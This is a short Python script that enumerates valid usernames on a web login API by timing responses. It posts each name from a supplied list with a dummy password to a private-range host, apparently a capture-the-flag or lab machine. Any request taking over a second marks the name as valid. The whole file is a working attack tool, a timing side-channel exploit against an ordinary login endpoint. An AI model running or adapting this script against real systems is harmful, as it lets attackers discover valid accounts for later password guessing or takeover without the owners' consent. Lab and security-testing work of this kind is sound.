#!/usr/bin/env python3
import sys
import requests
import time

def main():
	host = '10.10.156.130'

	with open(sys.argv[1]) as f:
	    usernames = f.readlines()
	usernames = [x.strip() for x in usernames] 

	for username in usernames:
		start = time.time()
		creds = {"username":username,"password":"notimportant"}
		r = requests.post("http://{}/api/user/login".format(host), data=creds)
		done = time.time()
		elapsed = done - start
		if elapsed > 1:
			print("[*] Valid user found: {}".format(username))

if __name__ == '__main__':
	if len(sys.argv) < 2:
		print("Usage: {} /path/usernames/file.txt".format(sys.argv[0]))
		sys.exit(1) 
	main()